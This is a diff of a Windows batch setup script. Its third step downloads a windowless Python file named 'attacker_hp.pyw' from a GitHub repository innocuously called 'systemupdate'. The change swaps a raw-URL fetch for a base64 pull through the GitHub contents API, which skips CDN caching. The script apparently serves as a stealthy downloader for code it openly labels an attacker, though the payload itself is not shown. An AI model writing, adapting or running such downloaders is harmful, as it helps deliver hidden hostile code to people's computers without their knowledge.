@@ -44,12 +44,9 @@ if %errorlevel% neq 0 (
 )
 echo Packages OK.
 
-:: === Step 3: Download attacker (auto latest commit, no CDN cache) ===
+:: === Step 3: Download attacker (API direct, no CDN) ===
 echo [3/4] Downloading attacker...
-for /f "delims=" %%i in ('python -c "import json,urllib.request;d=json.loads(urllib.request.urlopen('https://api.github.com/repos/blacknut0319-del/systemupdate/commits?per_page=1').read());print(d[0]['sha'][:8])" 2^>nul') do set LATEST=%%i
-if not defined LATEST set LATEST=main
-echo Latest: %LATEST%
-python -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/blacknut0319-del/systemupdate/%LATEST%/attacker_hp.pyw?t=%RANDOM%', r'%~dp0attacker_hp.pyw')"
+python -c "import urllib.request,base64,json;d=json.loads(urllib.request.urlopen('https://api.github.com/repos/blacknut0319-del/systemupdate/contents/attacker_hp.pyw').read());open(r'%~dp0attacker_hp.pyw','wb').write(base64.b64decode(d['content']))"
 if %errorlevel% neq 0 (
     echo ERROR: Download failed.
     pause
